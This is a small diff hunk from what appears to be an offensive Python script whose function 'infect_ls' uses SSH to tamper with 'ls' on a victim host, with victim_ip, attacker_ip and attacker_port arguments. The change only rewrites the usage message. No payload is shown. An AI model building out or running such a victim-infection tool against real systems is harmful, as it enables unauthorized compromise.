@@ -92,7 +92,7 @@ def infect_ls(client:paramiko.SSHClient, attacker_ip:str, attacker_port:str):
 if __name__ == '__main__':
     # If the arguments are not provided, print the usage
     if len(sys.argv) != 4:
-        print(f"Usage: {sys.argv[0]} <victim_ip> <attacker_ip> <attacker_port>")
+        print("Usage:" + sys.argv[0] + "<victim_ip> <attacker_ip> <attacker_port>")
         sys.exit(1)
         
     victim_ip = sys.argv[1]
